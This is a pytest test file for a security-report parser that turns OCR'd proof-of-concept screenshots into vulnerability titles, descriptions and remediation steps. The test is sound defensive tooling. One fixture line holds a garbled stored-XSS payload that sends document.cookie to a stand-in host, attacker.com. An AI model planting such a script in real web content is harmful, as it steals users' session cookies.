# -*- coding: utf-8 -*-
"""A finding recovered from a screenshot must describe the flaw it found.

    pytest tests/test_visual_poc_findings.py -v

WHY THIS EXISTS

When a VAPT scan file is a proof-of-concept screenshot rather than a scanner
export, there is no scanner metadata behind the finding. Everything on the card
was therefore a default, and the defaults were wrong for the vulnerability in
front of them. A stored-XSS PoC was delivered as:

    TITLE        Visual PoC: Vulnerability Proof Stored XSSI
    DESCRIPTION  OCR extracted vulnerability proof-of-concept:
                 Vulnerability Proof Stored XSSI
    REMEDIATION  Perform authenticated application scan checks using OWASP ZAP
                 or Burp Suite...
    STEPS        Apply the vendor-recommended fix... if no vendor patch is
                 available, apply compensating controls (network segmentation,
                 a WAF rule, or disabling the affected service)

The title and description carried an OCR artefact ("Stored XSS]" read as
"XSSI") into the customer's report and said nothing the reader did not already
know. The remediation told the auditor to run another scan. The developer steps
described applying a vendor patch to a flaw in the customer's own application,
where no vendor and no patch exist.

The class is recoverable: the PoC regex already ends in [A-Z]* precisely because
OCR runs the class name into the next character, so matching the class prefix
tolerantly recovers "stored xss" from "stored xssi".
"""
import pytest

from src.core.parsers.burp_parser import _POC_CLASSES, _describe_poc
from src.core.parsers.control_mapper import evaluate_cia_and_pii_impact


class _F(object):
    def __init__(self, title, description, evidence, severity="HIGH"):
        self.title = title
        self.description = description
        self.evidence = evidence
        self.remediation = ""
        self.severity = severity
        self.source_tool = "Burp Suite / Visual OCR"
        self.cvss_vector = ""


# ── the reported finding ─────────────────────────────────────────────────────

def test_the_ocr_artefact_is_recognised_as_stored_xss():
    """"Stored XSS]" reaches us as "Stored XSSI"."""
    name, desc, remed, steps = _describe_poc("Vulnerability Proof Stored XSSI")
    assert name == "Stored Cross-Site Scripting", name
    assert "XSSI" not in name, "the OCR artefact is still in the title"
    assert desc and remed and steps


def test_the_description_describes_the_flaw_not_the_match():
    name, desc, _r, _s = _describe_poc("Stored XSS")
    assert "OCR extracted" not in desc
    assert "session cookie" in desc.lower(), desc
    assert len(desc) > 120, "a description this short says nothing: %r" % desc


def test_the_remediation_fixes_xss_rather_than_recommending_a_scan():
    _n, _d, remed, steps = _describe_poc("Stored XSS")
    low = (remed + " " + steps).lower()
    assert "encoding" in low, remed
    assert "httponly" in low, remed
    assert "vendor" not in low, "still telling them to apply a vendor patch"
    assert "owasp zap" not in low, "still telling them to run another scan"


def test_the_class_reaches_the_cia_inference():
    """The description is what the CIA keywords are matched against.

    Naming the class properly is what lets a stored XSS score its real impact
    instead of falling through to "not determined".
    """
    name, desc, _r, _s = _describe_poc("Vulnerability Proof Stored XSSI")
    cia = evaluate_cia_and_pii_impact(
        _F("Visual PoC: " + name, desc,
           "bio:<script-tetch(http/ attacker.com/stealc='+ documentcookie)</script>"))[0]
    assert "C:HIGH" in cia and "I:HIGH" in cia, cia


# ── the rest of the table ────────────────────────────────────────────────────

@pytest.mark.parametrize("text,expected", [
    ("SQL Injection in the login form", "SQL Injection"),
    ("Stored XSS", "Stored Cross-Site Scripting"),
    ("Reflected XSS", "Reflected Cross-Site Scripting"),
    ("DOM-based XSS", "DOM-Based Cross-Site Scripting"),
    ("Cross-Site Scripting", "Cross-Site Scripting"),
    ("CSRF on password change", "Cross-Site Request Forgery"),
    ("OS command injection", "OS Command Injection"),
    ("Path traversal", "Path Traversal"),
    ("SSRF to metadata endpoint", "Server-Side Request Forgery"),
])
def test_each_class_is_recognised(text, expected):
    assert _describe_poc(text)[0] == expected


def test_the_specific_classes_win_over_the_generic_one():
    """"Stored XSS" must not fall through to plain Cross-Site Scripting."""
    assert _describe_poc("Stored XSS")[0] == "Stored Cross-Site Scripting"
    assert _describe_poc("Reflected XSS")[0] == "Reflected Cross-Site Scripting"


def test_an_unrecognised_poc_says_so_rather_than_guessing():
    name, desc, remed, steps = _describe_poc("Proof of Concept")
    assert name is None and desc is None and remed is None and steps is None


def test_every_row_is_complete():
    """A row missing its fix would silently fall back to the generic template."""
    for row in _POC_CLASSES:
        pattern, name, desc, remed, steps = row
        assert pattern and name, row
        assert len(desc) > 100, "%s has no real description" % name
        assert len(remed) > 80, "%s has no real remediation" % name
        assert steps.strip().startswith("1."), "%s steps are not numbered" % name
